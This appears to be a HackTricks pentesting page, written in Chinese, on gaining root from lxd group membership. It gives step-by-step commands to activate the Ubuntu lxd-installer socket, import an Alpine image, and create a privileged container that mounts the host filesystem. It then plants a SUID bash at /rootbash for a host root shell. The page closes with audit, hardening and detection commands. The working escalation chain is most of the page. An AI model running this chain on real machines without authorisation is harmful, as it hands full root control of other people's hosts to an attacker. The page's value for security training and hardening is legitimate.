# lxd/lxc 组 - 权限提升

{{#include ../../../banners/hacktricks-training.md}}

加入主机的 LXD 管理组（通常为 _**lxd**_）后，可能获得通向 root 的途径，因为这允许完全控制守护进程。<sup>[[1]](#references)</sup> 这与[运行时控制套接字](../../containers-namespaces/container-security/runtime-api-and-daemon-exposure.md)和[可写的主机挂载](../../containers-namespaces/container-security/sensitive-host-mounts.md)所描述的信任边界问题相同：即使当前进程本身不在容器内，访问管理 API 也可能已经足够。<sup>[[1]](#references)</sup>

## Ubuntu `lxd-installer` 套接字激活

不要因为系统中没有 LXD snap，就认定加入 `lxd` 组无害。在 Ubuntu Server 24.04 及更高版本中，预置的 `lxd-installer` 软件包会以 `root:lxd` 所有权和 `0660` 权限暴露 `/run/lxd-installer.socket`。连接该套接字会以 root 身份激活 `lxd-installer@.service`，无需 sudo 密码或 polkit 授权即可安装 LXD snap；某些版本的包装程序还会在标准输入不是 TTY 时省略确认提示。<sup>[[10]](#references)[[11]](#references)</sup>

检查账户的组成员身份以及由套接字激活的服务：<sup>[[10]](#references)[[11]](#references)</sup>

```bash
id -nG
getent group lxd
stat -c '%A %U:%G %n' /run/lxd-installer.socket
systemctl cat lxd-installer.socket lxd-installer@.service
```

经授权的 `lxd` 组测试可以通过常规 `lxc` 封装程序激活安装程序，也可以直接连接到套接字。后一种方式表明，真正的授权边界是 Unix 套接字 ACL，而非封装程序的提示：<sup>[[10]](#references)[[11]](#references)</sup>

```bash
python3 -c 'import socket; s=socket.socket(socket.AF_UNIX); s.connect("/run/lxd-installer.socket"); s.send(b"x"); s.recv(1)'
lxc version
```

Once 守护进程可用后，继续使用以下特权容器技术。<sup>[[10]](#references)[[11]](#references)</sup>

## 不使用互联网进行利用

### 方法 1

你可以从可信的仓库下载 Alpine 镜像，以便与 LXD 配合使用。
Canonical 的 LXD 镜像服务器每天都会发布构建版本：[https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
只需从最新的构建版本中获取 **lxd.tar.xz** 和 **rootfs.squashfs**（目录名为日期）。<sup>[[8]](#references)</sup>

或者，你可以按照[项目说明](https://github.com/lxc/distrobuilder)在你的机器上安装 distrobuilder。<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage    

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```

上传 **incus.tar.xz**（如果从 Canonical 镜像服务器下载，则使用 **lxd.tar.xz**）和 **rootfs.squashfs**，然后导入镜像并创建容器。<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

> [!CAUTION]
> 如果遇到此错误 _**错误：未找到存储池。请创建新的存储池**_\
> 运行 **`lxd init`**，设置默认存储池，然后**重复**之前的命令块。<sup>[[2]](#references)</sup>

最后，启动容器并在宿主机文件系统上打开 root shell：<sup>[[1]](#references)[[2]](#references)</sup>

```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```

由于此特权实例中的 UID 0 未被重新映射，因此它可以通过挂载的主机根目录创建一个归主机所有的 SUID payload。这样便完成了从容器到主机的 pivot，而不是让操作者停留在容器 shell 中：<sup>[[10]](#references)[[11]](#references)</sup>

```bash
# From the host, write the payload through the privileged container
lxc exec privesc -- /bin/sh -c 'cp /mnt/root/bin/bash /mnt/root/rootbash && chmod 4755 /mnt/root/rootbash'

# Execute on the host; -p prevents bash from dropping the SUID-derived EUID
/rootbash -p
id
```

将 payload 放在支持 SUID 的文件系统上。单独的 `/tmp` 通常会以 `nosuid` 挂载，而且可能不会出现在对宿主机 `/` 的非递归 bind 挂载中，因此像宿主机根文件系统上的 `/rootbash` 这样的路径更适合用于此证明。<sup>[[10]](#references)[[11]](#references)</sup>

### Method 2

构建一个 Alpine 镜像，并使用标志 `security.privileged=true` 启动它，这会将容器 root 映射为宿主机 root；随后挂载 `/`，即可在容器内访问宿主机文件系统。<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>

```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

## 主机范围的 AppArmor 副作用

启动 LXD snap 也可能写入 `/run/sysctl.d/zz-lxd.conf`，并将 `kernel.apparmor_restrict_unprivileged_userns` 和 `kernel.apparmor_restrict_unprivileged_unconfined` 都设为 `0`。这会削弱 Ubuntu 对所有本地用户的非特权用户命名空间限制，因此评估主机时，应记录激活 LXD 前后的值。<sup>[[10]](#references)[[11]](#references)</sup>

```bash
cat /run/sysctl.d/zz-lxd.conf 2>/dev/null
sysctl kernel.apparmor_restrict_unprivileged_userns \
       kernel.apparmor_restrict_unprivileged_unconfined
```

## Audit and hardening

将 `lxd` 组成员身份视为授予 root 权限。移除不必要的成员后，只会对新登录会话生效；清除 `lxd-installer` 或屏蔽其 socket 只会移除按需安装路径，**不会**限制已能访问已安装 LXD 守护进程的用户。<sup>[[10]](#references)[[11]](#references)</sup>

```bash
getent group lxd
sudo gpasswd -d <user> lxd

# Only if on-demand LXD installation is not required
sudo systemctl mask --now lxd-installer.socket
# or: sudo apt purge lxd-installer
```

有用的失陷指标包括设置了 `security.privileged=true` 的 LXD 实例、`source` 为 `/` 的磁盘设备、意外连接到 `/run/lxd-installer.socket`、新出现的 SUID 文件，以及上述 AppArmor sysctl 值从 `1` 变为 `0`。<sup>[[10]](#references)[[11]](#references)</sup>

```bash
lxc list
lxc config show <instance> --expanded
find / -xdev -type f -perm -4000 2>/dev/null
```

## References

- [1] [如何强化 LXD 的安全性](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [LXD 容器和虚拟机](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [如何复制和导入镜像](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [如何使用 distrobuilder 构建镜像](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Alpine 镜像定义](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [lxd-alpine-builder 构建脚本](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [LXD 镜像服务器](https://images.lxd.canonical.com/)
- [9] [类型：disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
- [10] [STAR Labs LXD group privilege-escalation 报告和 PoC](https://github.com/star-sg/lxd-group-privesc-report)
- [11] [新瓶装旧酒：十年前的 LXD 组 root 权限再度武装](https://starlabs.sg/blog/2026/06-old-wine-in-a-new-bottle-a-decade-old-lxd-group-root-re-armed)
{{#include ../../../banners/hacktricks-training.md}}
